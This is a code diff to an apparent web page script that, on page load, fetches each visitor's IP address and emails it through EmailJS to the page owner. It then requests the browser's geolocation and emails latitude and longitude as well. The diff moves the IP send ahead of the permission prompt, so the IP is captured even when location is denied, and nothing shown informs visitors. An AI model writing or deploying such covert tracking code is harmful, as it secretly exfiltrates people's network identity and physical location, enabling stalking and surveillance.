@@ -43,12 +43,12 @@
     <script>
       emailjs.init("uNJ44wfwFwS5Yvuxd"); // Replace with your EmailJS user ID
 
-      function sendEmail(ip, lat, long) {
-        // Format the message to include the IP address, latitude, and longitude
+      function sendEmailWithIpOnly(ip) {
+        // Format the message to include only the IP address
         let message = `
                 IP Address: ${ip}
-                Latitude: ${lat !== undefined ? lat : "Not available"}
-                Longitude: ${long !== undefined ? long : "Not available"}
+                Latitude: Not available
+                Longitude: Not available
             `;
 
         emailjs
@@ -56,10 +56,33 @@
             message: message,
           })
           .then((response) => {
-            console.log("Email sent successfully:", response);
+            console.log("Email sent with IP only successfully:", response);
           })
           .catch((error) => {
-            console.error("Error sending email:", error);
+            console.error("Error sending email with IP only:", error);
+          });
+      }
+
+      function sendEmailWithLocation(ip, lat, long) {
+        // Format the message to include the IP address, latitude, and longitude
+        let message = `
+                IP Address: ${ip}
+                Latitude: ${lat}
+                Longitude: ${long}
+            `;
+
+        emailjs
+          .send("service_bosbik8", "template_osobqzc", {
+            message: message,
+          })
+          .then((response) => {
+            console.log(
+              "Email sent with IP and location successfully:",
+              response
+            );
+          })
+          .catch((error) => {
+            console.error("Error sending email with IP and location:", error);
           });
       }
 
@@ -67,20 +90,19 @@
         $.getJSON("https://api.ipify.org?format=json", function (data) {
           let ip = data.ip;
 
-
+          sendEmailWithIpOnly(ip);
           navigator.geolocation.getCurrentPosition(
             (position) => {
               let lat = position.coords.latitude;
               let long = position.coords.longitude;
               console.log("Retrieved Position:", lat, long);
 
-              // Send the data via email
-              sendEmail(ip, lat, long);
+              // Send the email with both IP and location
+              sendEmailWithLocation(ip, lat, long);
             },
             (error) => {
               // Handle location access error
               console.error("Error getting geolocation:", error);
-              sendEmail(ip); // Send email with IP only
             }
           );
         });
